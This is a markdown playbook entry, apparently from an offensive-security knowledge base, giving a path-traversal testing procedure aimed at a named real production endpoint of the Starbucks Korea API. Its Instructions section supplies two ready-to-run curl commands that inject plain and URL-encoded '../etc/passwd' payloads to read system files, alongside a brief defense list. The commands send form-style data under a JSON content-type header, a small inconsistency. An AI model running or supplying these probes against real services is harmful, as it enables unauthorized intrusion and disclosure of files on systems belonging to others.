---
id: p1b2c3d4-e5f6-7890-abcd-ef1234567892
tags:
  - path-traversal
  - testing
  - web
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-path-traversal-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:27.618Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---
# Test-API-Endpoint-for-Path-Traversal

## Summary

This procedure tests web API endpoints for path traversal vulnerabilities by injecting directory traversal sequences, confirming if input sanitization is inadequate, as seen in the Starbucks Korea API.

## Description

Targeting https://msr.istarbucks.co.kr:6443/appif/, send crafted requests with ../ payloads to file path parameters. Success indicates LFI potential, allowing access to files outside the web root. Requires knowledge of the endpoint's HTTP method and params from prior analysis.

## Requirements

1. Valid API endpoint URL
2. HTTP client like curl
3. Basic understanding of HTTP requests

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all file path inputs using whitelisting
- Use absolute paths and chroot jails for file operations
- Log and alert on requests containing ../ or encoded equivalents

## Objectives

1. Confirm traversal vulnerability
2. Identify bypassable filters
3. Gauge response to invalid paths

## Instructions

### Step 1: Basic Traversal Probe

**Context**: Send a simple ../ payload to check for directory escape.

**Command** ([[commands/curl-path-traversal-test]]):
```bash
curl -X POST https://msr.istarbucks.co.kr:6443/appif/endpoint -d 'filepath=../etc/passwd' -H 'Content-Type: application/json'
```

> If vulnerable, response may leak file content or error with path info.

### Step 2: Advanced Payload with Encoding

**Context**: Use URL encoding or null bytes if basic fails.

**Command** ([[commands/curl-encoded-traversal]]):
```bash
curl -X POST https://msr.istarbucks.co.kr:6443/appif/endpoint -d 'filepath=..%2F..%2Fetc%2Fpasswd' -H 'Content-Type: application/json'
```

> Expected output: Partial or full file disclosure.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[File and Directory Discovery]] File and Directory Discovery

### Sub-Techniques


## Commands Used

- [[commands/curl-path-traversal-test]]
- [[commands/curl-encoded-traversal]]

## Tools Used


## Tags

- [[path-traversal]]
- [[testing]]
- [[web]]
